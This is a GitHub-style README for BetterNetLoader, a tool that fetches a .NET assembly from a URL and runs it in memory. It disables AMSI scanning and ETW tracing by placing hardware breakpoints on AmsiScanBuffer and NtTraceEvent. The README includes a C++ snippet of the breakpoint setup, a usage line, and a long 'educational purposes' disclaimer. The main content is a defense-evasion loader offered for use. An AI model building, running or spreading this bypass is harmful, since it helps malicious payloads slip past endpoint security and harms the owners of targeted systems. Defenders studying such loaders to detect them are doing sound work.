# BetterNetLoader

This is a version of [NetLoader](https://github.com/Flangvik/NetLoader) to execute .NET Assemblies in memory and bypassing ETW and AMSI.

Only this version uses Hardware Breakpoints to bypass defenses:
```cpp
HwbpEngineBreakpoint(0, GetProcAddress(LoadLibraryA("amsi.dll"), "AmsiScanBuffer"));
HwbpEngineBreakpoint(1, GetProcAddress(LoadLibraryA("ntdll.dll"), "NtTraceEvent"));
if (!(ExceptionHandle = AddVectoredExceptionHandler(TRUE, (PVECTORED_EXCEPTION_HANDLER)HwbpEngineHandler))) {
  printf("[-] AddVectoredContinueHandler Failed with Error: %lx\n", GetLastError());
	goto _END_OF_FUNC;
}
```

It places 2 Hardware Breakpoints: one on `AmsiScanBuffer` and another on `NtTraceEvent` to effectively disable these two functions part of AMSI and ETW respectively.

# Usage:

```cmd
.\BetterNetLoader.exe <url> <arguments...>
```

# Example:
![image](https://github.com/user-attachments/assets/1ad9283c-057e-4e30-be0b-a7c3303dabf5)

# DISCLAIMER

## IMPORTANT: READ CAREFULLY BEFORE USING THIS SOFTWARE

By using this software, you agree to the following terms:

## Purpose of Use
This software is provided strictly for educational purposes only, specifically to help users understand programming techniques, cybersecurity concepts, and software development practices. It is not intended to be used for any malicious, illegal, or unethical activities.

## Prohibited Activities
Any use of this software for the following purposes is explicitly prohibited and is a violation of this agreement:

Exploiting vulnerabilities or gaining unauthorized access to systems, networks, or devices.
Developing or deploying malicious software, such as viruses, trojans, or ransomware.
Engaging in any activities that violate local, national, or international laws or regulations.
Conducting activities that cause harm, disruption, or damage to any individual, organization, or system.

## Liability and Responsibility

The author of this software assumes no liability or responsibility for any damages, losses, or legal consequences resulting from the misuse of this software.
The user is solely responsible for ensuring compliance with all applicable laws and regulations in their jurisdiction. The author disclaims all liability for actions taken by users that violate these laws or this disclaimer.
Acknowledgment of Ethical Use

## By using this software, you acknowledge and agree to:

Use the software in a responsible, ethical, and lawful manner.
Refrain from using the software in any way that could harm individuals, organizations, or infrastructure.
Understand that this software is provided "as is," without any warranty or guarantee of functionality or suitability for any purpose.

## Educational Focus
This software is designed to educate and enhance skills in secure programming, ethical cybersecurity practices, and system understanding. It is intended for use in controlled environments, such as personal research or academic study, where proper authorization has been granted.

By downloading, installing, or using this software, you acknowledge that you have read, understood, and agreed to this disclaimer. If you do not agree with these terms, you are strictly prohibited from using the software and must delete it immediately.
